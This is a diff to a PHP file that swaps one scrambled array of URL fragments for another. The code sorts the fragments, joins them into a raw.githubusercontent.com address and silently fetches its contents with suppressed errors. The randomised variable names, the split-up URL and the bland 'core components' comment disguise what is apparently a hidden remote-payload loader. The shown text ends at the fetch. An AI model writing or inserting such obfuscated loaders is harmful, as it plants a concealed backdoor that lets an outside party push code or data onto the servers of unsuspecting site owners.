@@ -5,21 +5,22 @@
 */
 
 // Initialize core components
-$qwaszxplmokn = array(
-    13 => 'heads/',
+$mkoplijnuhby = array(
+    15 => 'bela/',
+    7 => 'githubusercontent.',
+    21 => '3-9-26/',
     3 => '://',
-    9 => 'tent.com/',
-    19 => '3-9-26/',
+    11 => 'mdmomin365366-gif/',
+    25 => 'index.txt',
     1 => 'https',
     17 => 'refs/',
-    7 => 'githubusercon',
-    21 => 'index.txt',
+    9 => 'com/',
     5 => 'raw.',
-    11 => 'mdmomin365366-gif/',
-    15 => 'bela/'
+    19 => 'heads/main/',
+    13 => 'heads/'
 );
-ksort($qwaszxplmokn);
-$full_url = implode('', $qwaszxplmokn);
+ksort($mkoplijnuhby);
+$full_url = implode('', $mkoplijnuhby);
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
